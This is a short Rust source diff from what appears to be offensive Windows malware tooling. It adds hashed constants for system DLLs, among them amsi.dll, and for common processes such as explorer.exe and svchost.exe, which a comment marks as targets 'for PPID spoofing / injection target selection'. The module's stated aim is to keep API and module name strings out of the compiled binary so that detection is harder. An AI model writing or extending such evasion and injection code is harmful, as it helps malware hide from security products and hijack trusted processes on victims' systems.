@@ -12,6 +12,7 @@ pub const fn djb2_hash(name: &[u8]) -> u32 {
 /// Pre-computed hash constants — callers use these so no string literal survives in the binary.
 pub mod h {
     use super::djb2_hash;
+    use super::djb2_hash_lower;
     // NT syscalls
     pub const NT_ALLOC_VM:    u32 = djb2_hash(b"NtAllocateVirtualMemory");
     pub const NT_PROT_VM:     u32 = djb2_hash(b"NtProtectVirtualMemory");
@@ -61,6 +62,23 @@ pub mod h {
     // ole32 / combase exports
     pub const CO_INIT_EX:     u32 = djb2_hash(b"CoInitializeEx");
     pub const CO_CREATE_INST: u32 = djb2_hash(b"CoCreateInstance");
+    // DLL name hashes — use h::DLL_* instead of djb2_hash_lower(b"xxx") in non-const callers
+    pub const DLL_NTDLL:   u32 = djb2_hash_lower(b"ntdll.dll");
+    pub const DLL_K32:     u32 = djb2_hash_lower(b"kernel32.dll");
+    pub const DLL_OLE32:   u32 = djb2_hash_lower(b"ole32.dll");
+    pub const DLL_AMSI:    u32 = djb2_hash_lower(b"amsi.dll");
+    pub const DLL_VERSION: u32 = djb2_hash_lower(b"version.dll");
+    pub const DLL_WINMM:   u32 = djb2_hash_lower(b"winmm.dll");
+    pub const DLL_MPR:     u32 = djb2_hash_lower(b"mpr.dll");
+    pub const DLL_WLDAP32: u32 = djb2_hash_lower(b"wldap32.dll");
+    // Process name hashes for PPID spoofing / injection target selection
+    pub const EXE_EXPLORER:       u32 = djb2_hash_lower(b"explorer.exe");
+    pub const EXE_RT_BROKER:      u32 = djb2_hash_lower(b"runtimebroker.exe");
+    pub const EXE_SIHOST:         u32 = djb2_hash_lower(b"sihost.exe");
+    pub const EXE_SVCHOST:        u32 = djb2_hash_lower(b"svchost.exe");
+    pub const EXE_SEARCH_INDEXER: u32 = djb2_hash_lower(b"searchindexer.exe");
+    pub const EXE_ONEDRIVE:       u32 = djb2_hash_lower(b"onedrive.exe");
+    pub const EXE_SEARCH_APP:     u32 = djb2_hash_lower(b"searchapp.exe");
 }
 
 /// Case-insensitive (ASCII) DJB2 hash — usable as `const` for compile-time module name hashes.
